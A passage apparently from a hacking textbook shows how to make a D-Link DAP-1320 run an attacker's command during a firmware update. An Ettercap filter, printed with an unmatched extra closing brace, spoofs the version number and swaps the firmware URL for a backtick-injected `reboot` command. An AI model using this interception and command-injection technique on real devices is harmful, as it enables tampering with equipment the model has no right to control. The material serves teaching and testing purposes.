Armed with this information, we can assume that if we change the minor number to 12 and the firmware link to a shell command, we will force the device to attempt to update and, consequently, run our command. In order to accomplish this task, we need to create an Ettercap filter ➊ (previously saved and displayed here), compile it ➋, and then run it ➌, as follows:

```
root@kali:~/DAP-1320# cat ettercap.filter
if (ip.proto == TCP && tcp.src == 80) {
msg("Processing Minor Response...\\n");
if (search(DATA.data, "Minor>11")) {
replace("<Minor>11", "<Minor>12");
msg("zapped Minor version!\\n");
}
}

if (ip.proto == TCP && tcp.src == 80) {
msg("Processing Firmware Response...\\n");
if (search(DATA.data, "http://d")) {
replace("http://d", "`reboot`");
msg("zapped firmware!\\n");
}
}
}
```
